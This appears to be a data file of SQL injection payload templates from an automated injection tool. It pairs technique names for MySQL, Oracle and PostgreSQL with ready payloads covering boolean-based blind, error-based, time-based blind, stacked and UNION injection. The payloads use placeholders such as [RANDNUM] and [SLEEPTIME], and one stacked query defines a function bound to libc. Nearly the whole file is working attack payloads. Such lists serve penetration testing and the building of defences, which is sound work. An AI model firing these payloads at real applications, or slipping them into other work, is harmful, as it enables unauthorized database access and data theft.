MySQL < 5.0.12 stacked queries (heavy query - comment):::;SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
MySQL < 5.0.12 stacked queries (heavy query):::;SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
MySQL <= 5.0.11 AND time-based blind (heavy query - comment):::AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
MySQL <= 5.0.11 AND time-based blind (heavy query):::AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
MySQL <= 5.0.11 OR time-based blind (heavy query - comment):::OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
MySQL <= 5.0.11 OR time-based blind (heavy query):::OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
MySQL <= 5.0.11 time-based blind - ORDER BY, GROUP BY clause (heavy query):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))
MySQL <= 5.0.11 time-based blind - Parameter replace (heavy queries):::(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM])
MySQL > 5.0.11 stacked queries:::;SELECT SLEEP([SLEEPTIME])
MySQL > 5.0.11 stacked queries (comment):::;SELECT SLEEP([SLEEPTIME])
MySQL > 5.0.11 stacked queries (query SLEEP - comment):::;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL > 5.0.11 stacked queries (query SLEEP):::;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR):::AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR):::OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR):::,(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)
MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR):::AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR):::OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause:::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))
MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))
MySQL >= 5.0 boolean-based blind - Stacked queries:::;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)
MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR):::,(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
MySQL >= 5.0 error-based - Parameter replace (FLOOR):::(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
MySQL >= 5.0.12 AND time-based blind:::AND SLEEP([SLEEPTIME])
MySQL >= 5.0.12 AND time-based blind (comment):::AND SLEEP([SLEEPTIME])
MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment):::AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 5.0.12 AND time-based blind (query SLEEP):::AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 5.0.12 OR time-based blind:::OR SLEEP([SLEEPTIME])
MySQL >= 5.0.12 OR time-based blind (comment):::OR SLEEP([SLEEPTIME])
MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment):::OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 5.0.12 OR time-based blind (query SLEEP):::OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 5.0.12 RLIKE time-based blind:::RLIKE SLEEP([SLEEPTIME])
MySQL >= 5.0.12 RLIKE time-based blind (comment):::RLIKE SLEEP([SLEEPTIME])
MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment):::RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP):::RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause:::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END))
MySQL >= 5.0.12 time-based blind - Parameter replace:::(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END)
MySQL >= 5.0.12 time-based blind - Parameter replace (substraction):::(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE):::AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))
MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML):::AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])
MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE):::OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))
MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML):::OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])
MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE):::,EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))
MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML):::,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])
MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE):::PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')),1)
MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE):::(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')))
MySQL >= 5.1 error-based - Parameter replace (UPDATEXML):::(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1]))
MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE):::PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)
MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE):::PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)
MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED):::AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))
MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP):::AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))
MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED):::OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))
MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP):::OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))
MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED):::,(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)
MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP):::,(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x)))s)
MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED):::(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))
MySQL >= 5.5 error-based - Parameter replace (EXP):::EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))
MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS):::AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))
MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS):::OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))
MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS):::,(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8))))x)
MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS):::JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))
MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT):::AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1])
MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET):::AND MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])
MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int):::AND ([RANDNUM]=[RANDNUM])*[RANDNUM1]
MySQL AND time-based blind (ELT - comment):::AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
MySQL AND time-based blind (ELT):::AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT):::OR ELT([RANDNUM]=[RANDNUM],[RANDNUM1])
MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET):::OR MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])
MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int):::OR ([RANDNUM]=[RANDNUM])*[RANDNUM1]
MySQL OR error-based - WHERE or HAVING clause (FLOOR):::OR 1 GROUP BY CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)
MySQL OR time-based blind (ELT - comment):::OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
MySQL OR time-based blind (ELT):::OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause:::RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))
MySQL UNION query (NULL) - 1 to 10 columns:::None
MySQL UNION query (NULL) - 11 to 20 columns:::None
MySQL UNION query (NULL) - 21 to 30 columns:::None
MySQL UNION query (NULL) - 31 to 40 columns:::None
MySQL UNION query (NULL) - 41 to 50 columns:::None
MySQL UNION query (NULL) - [COLSTART] to [COLSTOP] columns (custom):::None
MySQL UNION query ([CHAR]) - 1 to 10 columns:::None
MySQL UNION query ([CHAR]) - 11 to 20 columns:::None
MySQL UNION query ([CHAR]) - 21 to 30 columns:::None
MySQL UNION query ([CHAR]) - 31 to 40 columns:::None
MySQL UNION query ([CHAR]) - 41 to 50 columns:::None
MySQL UNION query ([CHAR]) - [COLSTART] to [COLSTOP] columns (custom):::None
MySQL UNION query ([RANDNUM]) - 1 to 10 columns:::None
MySQL UNION query ([RANDNUM]) - 11 to 20 columns:::None
MySQL UNION query ([RANDNUM]) - 21 to 30 columns:::None
MySQL UNION query ([RANDNUM]) - 31 to 40 columns:::None
MySQL UNION query ([RANDNUM]) - 41 to 50 columns:::None
MySQL UNION query ([RANDNUM]) - [COLSTART] to [COLSTOP] columns (custom):::None
MySQL boolean-based blind - Parameter replace (ELT - original value):::ELT([RANDNUM]=[RANDNUM],[ORIGVALUE])
MySQL boolean-based blind - Parameter replace (ELT):::ELT([RANDNUM]=[RANDNUM],[RANDNUM1])
MySQL boolean-based blind - Parameter replace (MAKE_SET - original value):::MAKE_SET([RANDNUM]=[RANDNUM],[ORIGVALUE])
MySQL boolean-based blind - Parameter replace (MAKE_SET):::MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])
MySQL boolean-based blind - Parameter replace (bool*int - original value):::([RANDNUM]=[RANDNUM])*[ORIGVALUE]
MySQL boolean-based blind - Parameter replace (bool*int):::([RANDNUM]=[RANDNUM])*[RANDNUM1]
MySQL inline queries:::(SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))
MySQL time-based blind - Parameter replace (ELT):::ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
MySQL time-based blind - Parameter replace (MAKE_SET):::MAKE_SET([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
MySQL time-based blind - Parameter replace (bool):::([RANDNUM]=[RANDNUM] AND SLEEP([SLEEPTIME]))
OR boolean-based blind - WHERE or HAVING clause:::OR [RANDNUM]=[RANDNUM]
OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment):::OR [RANDNUM]=[RANDNUM]
OR boolean-based blind - WHERE or HAVING clause (MySQL comment):::OR [RANDNUM]=[RANDNUM]
OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment):::OR NOT [RANDNUM]=[RANDNUM]
OR boolean-based blind - WHERE or HAVING clause (NOT - comment):::OR NOT [RANDNUM]=[RANDNUM]
OR boolean-based blind - WHERE or HAVING clause (NOT):::OR NOT [RANDNUM]=[RANDNUM]
OR boolean-based blind - WHERE or HAVING clause (comment):::OR [RANDNUM]=[RANDNUM]
OR boolean-based blind - WHERE or HAVING clause (subquery - comment):::OR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN):::AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL
Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN):::AND [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))
Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH):::AND [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))
Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS):::AND [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')
Oracle AND error-based - WHERE or HAVING clause (XMLType):::AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
Oracle AND time-based blind:::AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
Oracle AND time-based blind (comment):::AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
Oracle AND time-based blind (heavy query - comment):::AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
Oracle AND time-based blind (heavy query):::AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN):::OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL
Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN):::OR [RANDNUM]=CTXSYS.DRITHSX.SN([RANDNUM],('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))
Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH):::OR [RANDNUM]=DBMS_UTILITY.SQLID_TO_SQLHASH(('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'))
Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS):::OR [RANDNUM]=UTL_INADDR.GET_HOST_ADDRESS('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]')
Oracle OR error-based - WHERE or HAVING clause (XMLType):::OR [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
Oracle OR time-based blind:::OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
Oracle OR time-based blind (comment):::OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
Oracle OR time-based blind (heavy query - comment):::OR [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
Oracle OR time-based blind (heavy query):::OR [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
Oracle boolean-based blind - ORDER BY, GROUP BY clause:::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
Oracle boolean-based blind - Parameter replace:::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
Oracle boolean-based blind - Parameter replace (original value):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
Oracle boolean-based blind - Stacked queries:::;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL
Oracle error-based - ORDER BY, GROUP BY clause:::,(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
Oracle error-based - Parameter replace:::(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
Oracle inline queries:::(SELECT '[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]' FROM DUAL)
Oracle stacked queries (DBMS_LOCK.SLEEP - comment):::;BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END
Oracle stacked queries (DBMS_LOCK.SLEEP):::;BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END
Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment):::;SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL
Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE):::;SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL
Oracle stacked queries (USER_LOCK.SLEEP - comment):::;BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END
Oracle stacked queries (USER_LOCK.SLEEP):::;BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END
Oracle stacked queries (heavy query - comment):::;SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5
Oracle stacked queries (heavy query):::;SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5
Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP):::,(BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)
Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query):::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP):::BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;
Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)
Oracle time-based blind - Parameter replace (heavy queries):::(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END) FROM DUAL)
PostgreSQL < 8.2 stacked queries (Glibc - comment):::;CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])
PostgreSQL < 8.2 stacked queries (Glibc):::;CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])
PostgreSQL > 8.1 AND time-based blind:::AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
PostgreSQL > 8.1 AND time-based blind (comment):::AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
PostgreSQL > 8.1 OR time-based blind:::OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
PostgreSQL > 8.1 OR time-based blind (comment):::OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
PostgreSQL > 8.1 stacked queries:::;SELECT PG_SLEEP([SLEEPTIME])
PostgreSQL > 8.1 stacked queries (comment):::;SELECT PG_SLEEP([SLEEPTIME])
PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause:::,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE 1/(SELECT 0) END))
PostgreSQL > 8.1 time-based blind - Parameter replace:::(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
